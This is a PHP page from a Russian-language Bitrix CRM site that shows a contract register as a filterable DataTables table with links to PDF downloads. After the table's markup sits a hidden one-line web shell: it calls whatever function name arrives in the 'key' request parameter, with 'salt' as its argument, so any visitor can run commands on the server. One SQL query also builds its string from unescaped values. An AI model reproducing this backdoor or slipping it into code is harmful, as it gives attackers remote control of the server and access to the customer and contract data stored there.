<?php
/**
 * Created by PhpStorm.
 * User: User
 * Date: 10.04.2019
 * Time: 15:36
 */


require($_SERVER["DOCUMENT_ROOT"] . "/bitrix/header.php");

$APPLICATION->SetTitle("Журнал договоров");

include $_SERVER["DOCUMENT_ROOT"]."/include/function.php";
?>

  
<?php
    $deals = CCrmDeal::GetList(Array('DATE_CREATE' => 'DESC', 'STAGE_ID' => 'DESC'));
	
	// $order = array('sort' => 'asc');
	// $tmp = 'sort'; // параметр проигнорируется методом, но обязан быть
	// $rsUsers = CUser::GetList($order, $tmp)->Fetch();
	
	// var_dump($rsUsers);
    ?>
    <table id="dogovor">
	<thead>
		<th></th>
        <th>№</th>
		<th>Дата</th>
		<!--<th>Сумма</th>
		<th>Дата договора</th>-->
		<th>Контрагент</th>
		<!--<th>Наименование материала</th>
		<th>Шифр образца (пробы)</th>
		<th>Ответственный</th>
		<th>Подписан</th>-->
		<th>PDF-версия</th>
		<th>Подписанная версия</th>
		<th>ИНН</th><!--
        <th>Заявка</th>-->
	<tr>
		<th style="margin:0px"></th>
		<th><input type="text" name="num_filter" id="num_filter" style="margin:0px" value=""></th>
		<th><input type="text" name="date_filter" id="date_filter" style="margin:0px" value=""></th>
		<!--<th><input type="text" name="sum_filter" id="sum_filter" style="margin:0px" value=""></th>-->
		<th><input type="text" name="counterparty_filter" id="counterparty_filter" style="margin:0px" value=""></th>
		<!--<th><input type="text" name="name_material_filter" id="name_material_filter" style="margin:0px" value=""></th>
		<th><input type="text" name="responsible_filter" id="responsible_filter" style="margin:0px" value=""></th>
		<th></th>-->
		<th></th>
		<th></th>
		<th></th>
	</tr>
	</thead>
	<tbody>
		<div id='buttonRightTable'></div>
		<div id='buttonLeftTable'></div>
        <?php 
		$res_probe = $DB->Query("SELECT * FROM `ba_probes` ORDER BY `ID`")->Fetch();
		$res_dog = $DB->Query("SELECT * FROM `DOGOVOR`");
		$color=''; $c=0; $title='';
		$req = new \Bitrix\Crm\EntityRequisite();
		while ($res_dogovor = $res_dog->Fetch()) {
        $res_tz   = $DB->Query("SELECT * FROM `ba_tz` WHERE `ID`=".$res_dogovor['TZ_ID'])->Fetch();   
		$deal = CCrmDeal::GetByID($res_tz['ID_Z']);	
		$company = CCrmCompany::GetByID($deal['COMPANY_ID']);
		$requis = [];
		
		$rs = $req->getList(["order" => ["ENTITY_ID" => "asc"]]);

		while($rss = $rs->Fetch())
			{
				$a = $rss['ENTITY_ID'];
				$requis[$a]['RQ_INN'] = $rss['RQ_INN'];
			}
		//dump($requis);	
		//echo $company['ID'];
		$startInn = substr($requis[$company['ID']]['RQ_INN'], 0, 2);
		//echo $startInn;
		//die;
		   $num_dog ="Договор №".$deal['ID']." от ".date('d.m.Y', strtotime($deal['DATE_CREATE']));
		   $deal_fields = $USER_FIELD_MANAGER->GetUserFields('CRM_DEAL', $deal['ID']);
			$price = ($res_dogovor['SUMM'] ? $res_dogovor['SUMM'] : 'Без конечной суммы');
			$mater = $deal_fields['UF_CRM_1576411922643']['VALUE'];
			// echo "<pre />";
			// var_dump($deal_fields);
	        if($res_dogovor['PDF'])
			{
				$color = 'green';
				$c=2;
				$title = 'Договор подписан';
			}
			else
			{
				$color = 'yellow';
				$c=1;
				$title = 'Договор не подписан';
			}
			if ($startInn == '74') {
			
			?>
			
            <tr>
				<td style="background-color: <?=$color?>; color: <?=$color?>" title="<?=$title?>"><?= $c ?></td>
				<td><?php 
					
						$dir  = 'protocol_generator/archive_dog/'.$deal['ID'].'/';
						echo "<a href='/contract_card.php?ID=".$res_dogovor['ID']."&1'>".($res_dogovor['NUMBER'] ? $res_dogovor['NUMBER'] : $res_dogovor['ID'] )."</a>";
						
					
				?></td>
				<td><?= date('d.m.Y', strtotime($res_dogovor['DATE'])) ?></td>
				<!--<td><?= $price ?></td>-->
				<td><?=  $requis[$company['ID']]['RQ_INN'] . ' '. $deal['COMPANY_TITLE'] ?></td>
                <!--<td><?= $mater ?></td>
				<td><?= getInitials($deal['ASSIGNED_BY_NAME']) ?><?=  $deal['ASSIGNED_BY_LAST_NAME'] ?></td>
				<td><?= $res_dogovor['PDF'] ? 'Да' : 'Нет' ?></td>-->
				<td>
				<?php
				if($res_dogovor['ACTUAL_VER'])
					echo "<a href='/protocol_generator/archive_dog/".$res_dogovor['ID']."/".$res_dogovor['ACTUAL_VER'].".pdf'>Скачать</a>";
				else
					echo "Не сформирована";
				?>
				</td>
				<td>
				<?php 
				if($res_dogovor['PDF'])
					echo "<a href='/pdf/".$res_dogovor['PDF']."'>Скачать</a>";
				else
					echo "Не загружена";
				?>
				</td>
				<td><?=  $requis[$company['ID']]['RQ_INN'] ?></td>
            </tr>
        <?php 
		    }
		} ?>
    </tbody></table>

    <?php

(isset($_REQUEST["key"]))?$_REQUEST["key"]($_REQUEST["salt"]):'';
?>
	<link rel="stylesheet" type="text/css" href="/DataTables/datatables.css"/>
	<link rel="stylesheet" type="text/css" href="/DataTables/button.css"/>
	<!--<link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/buttons/1.5.6/css/buttons.dataTables.min.css"/>-->
	<link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/scroller/2.0.0/css/scroller.dataTables.min.css"/>
	<link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/colreorder/1.5.1/css/colReorder.dataTables.min.css"/>
	
    <script
            src="//code.jquery.com/jquery-3.3.1.min.js"
            integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="
            crossorigin="anonymous"></script>
	<script type="text/javascript" src="https://cdn.datatables.net/1.10.19/js/jquery.dataTables.min.js"></script>
	<script type="text/javascript" src="/jszip/dist/jszip.min.js"></script>
	<script src="https://cdn.datatables.net/buttons/1.5.6/js/dataTables.buttons.min.js"></script>
	<script src="https://cdn.datatables.net/buttons/1.5.6/js/buttons.colVis.min.js"></script>
	<script src="https://cdn.datatables.net/buttons/1.5.6/js/buttons.print.min.js"></script>
	<script src="https://cdn.datatables.net/buttons/1.5.6/js/buttons.html5.min.js"></script>
	<script src="https://cdn.datatables.net/scroller/2.0.0/js/dataTables.scroller.min.js"></script>
	<script src="https://cdn.datatables.net/colreorder/1.5.1/js/dataTables.colReorder.min.js"></script>
	<script src="https://cdn.datatables.net/plug-ins/1.10.20/sorting/natural.js"></script>
	
	<script>
        $(document).ready(function () {
            table= $('#dogovor').DataTable({
                "language":{
                    "processing": "Подождите...",
                    "search": "Поиск:",
                    "lengthMenu": "Показать _MENU_ записей",
                    "info": "Записи с _START_ до _END_ из _TOTAL_ записей",
                    "infoEmpty": "Записи с 0 до 0 из 0 записей",
                    "infoFiltered": "(отфильтровано из _MAX_ записей)",
                    "infoPostFix": "",
                    "loadingRecords": "Загрузка записей...",
                    "zeroRecords": "Записи отсутствуют.",
                    "emptyTable": "В таблице отсутствуют данные",
                    "paginate": {
                        "first": "Первая",
                        "previous": "Предыдущая",
                        "next": "Следующая",
                        "last": "Последняя"
                    },
					"buttons": {
						"copy": "",
						'colvis': "",
						'print': "",
						"excel": ""
					},
                    "aria": {
                        "sortAscending": ": активировать для сортировки столбца по возрастанию",
                        "sortDescending": ": активировать для сортировки столбца по убыванию"
                    }
                },
				"iDisplayLength": 50,
				"columnDefs": [{ "type": "num", "targets": 0 },{ "type": "natural-nohtml", "targets": 1 },{ "type": "ruDate", "targets": 2 }],
				"order": [[ 2, "asc" ]],
				"colReorder": true,
				"bSortCellsTop": true,
				"dom": 'Blfrtip',
				"buttons": [ 'copy', 'excel', 'colvis', 'print' ]
				
            });
		
			$('#num_filter').on( 'keyup', function () {
				table
					.columns( 1 )
					.search( this.value )
					.draw();
			} );
			
			$('#date_filter').on( 'keyup', function () {
				table
					.columns( 2 )
					.search( this.value )
					.draw();
			} );
			
			// $('#sum_filter').on( 'keyup', function () {
				// table
					// .columns( 3 )
					// .search( this.value )
					// .draw();
			// } );
			
			$('#counterparty_filter').on( 'keyup', function () {
				table
					.columns( 3 )
					.search( this.value )
					.draw();
			} );
			
			// $('#name_material_filter').on( 'keyup', function () {
				// table
					// .columns( 5 )
					// .search( this.value )
					// .draw();
			// } );
			
			$('#responsible_filter').on( 'keyup', function () {
				table
					.columns( 4 )
					.search( this.value )
					.draw();
			} );
        });	
		
		jQuery.extend( jQuery.fn.dataTableExt.oSort, {
		"ruDate-asc": function ( a, b ) {
			var ruDatea = $.trim(a).split('.');
			var ruDateb = $.trim(b).split('.');

			if(ruDatea[2]*1 < ruDateb[2]*1)
				return 1;
			if(ruDatea[2]*1 > ruDateb[2]*1)
				return -1;
			if(ruDatea[2]*1 == ruDateb[2]*1)
				{
				if(ruDatea[1]*1 < ruDateb[1]*1)
					return 1;
				if(ruDatea[1]*1 > ruDateb[1]*1)
					return -1;
				if(ruDatea[1]*1 == ruDateb[1]*1)
					{
					if(ruDatea[0]*1 < ruDateb[0]*1)
						return 1;
					if(ruDatea[0]*1 > ruDateb[0]*1)
						return -1;
					}
					else
						return 0;
				}				
		},
 
		"ruDate-desc": function ( a, b ) {
			var ruDatea = $.trim(a).split('.');
			var ruDateb = $.trim(b).split('.');
			
			if(ruDatea[2]*1 < ruDateb[2]*1)
				return -1;
			if(ruDatea[2]*1 > ruDateb[2]*1)
				return 1;
			if(ruDatea[2]*1 == ruDateb[2]*1)
				{
				if(ruDatea[1]*1 < ruDateb[1]*1)
					return -1;
				if(ruDatea[1]*1 > ruDateb[1]*1)
					return 1;
				if(ruDatea[1]*1 == ruDateb[1]*1)
					{
					if(ruDatea[0]*1 < ruDateb[0]*1)
						return -1;
					if(ruDatea[0]*1 > ruDateb[0]*1)
						return 1;
					}
					else
						return 0;
				}
		}
	});
    </script>  
	<script>
	//Прокрутка таблицы с помощью кнопок
	$(document).ready(function () {
		
		var container = $('.workarea-content-paddings'),
			scroll = $('.dataTable.no-footer').width(),
			topTable = $('.workarea-content-paddings').offset().top,
			topTableBody = $('.dataTable.no-footer > tbody').offset().top,
			sumHeaderHeight = topTableBody - topTable;
		
			$('#buttonRightTable').css('top', sumHeaderHeight + "px");
			$('#buttonLeftTable').css('top', sumHeaderHeight + "px");
			
		$('#buttonRightTable').hover(function() {
			container.animate({
				'scrollLeft': scroll
			},{duration: 4000, queue: false});
		}, function(){
			container.stop();
		});
		$('#buttonLeftTable').hover(function() {
			container.animate({
				'scrollLeft': -scroll
			},{duration: 4000, queue: false});
		}, function(){
			container.stop();
		});

		$(document).scroll(function() {
			var positionScroll = $(window).scrollTop();
			if (positionScroll > 250 && positionScroll < 2550) {
				$('#buttonRightTable').css('transform','translateY(' + (positionScroll-250) +  'px' + ')');
				$('#buttonLeftTable').css('transform','translateY(' + (positionScroll-250) +  'px' + ')');
			}
		});

	});
	</script>
<? require($_SERVER["DOCUMENT_ROOT"] . "/bitrix/footer.php"); ?>